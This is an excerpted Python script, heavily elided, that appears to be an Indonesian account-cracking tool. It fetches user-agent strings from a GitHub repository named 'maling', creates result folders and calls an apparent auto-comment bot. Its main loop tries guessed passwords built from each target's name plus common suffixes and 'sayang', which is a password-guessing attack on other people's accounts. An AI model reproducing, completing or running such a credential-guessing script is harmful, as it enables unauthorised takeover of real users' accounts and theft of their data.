...
ua = s.get("https://raw.githubusercontent.com/amdiutama/maling/main/ua.txt").text.strip()
...
def __cekfol__():
	...
	try:
		...
		bot_komen()
def logo():
	s.get("https://raw.githubusercontent.com/amdiutama/maling/main/.ua.txt").text.strip()
	os.system("mkdir /results")
	try:
		token = open('.ua.txt')
		token = open('ua')
	except (KeyError,IOError):
		os.system("echo 'Opera/9.6 (Windows NT 6.0; U; Opera/8.0 (J2ME/MIDP; Opera Mini/2.0 ru; U; ssr); ru)' >> .ua.txt")
		os.system("echo 'Opera/9.6 (Windows NT 6.0; U; Opera/8.0 (J2ME/MIDP; Opera Mini/2.0 ru; U; ssr); ru)' >> ua")
	os.system("clear")
...
def indo():
	...
	def main(user):
		...
		try:
			...
			pass
		try:
			for pw in [name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','sayang']:
